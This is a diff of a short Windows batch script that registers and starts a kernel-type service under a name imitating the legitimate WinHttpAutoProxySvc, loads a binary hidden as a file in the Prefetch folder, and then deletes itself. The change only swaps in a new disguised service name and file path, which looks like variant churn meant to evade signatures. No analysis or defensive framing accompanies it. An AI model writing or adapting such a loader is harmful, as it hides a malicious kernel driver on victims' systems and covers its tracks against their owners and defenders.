@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create WinHttpAutoProxySvc287_c binpath=C:\Windows\Prefetch\UPDATE.EXE-E632877B.pf type=kernel
-sc start WinHttpAutoProxySvc287_c
+sc create AutoHttpWinProxySvc1059_c binpath=C:\Windows\Prefetch\UPDATE.EXE-85KZT36B.pf type=kernel
+sc start AutoHttpWinProxySvc1059_c
 del "%~f0"
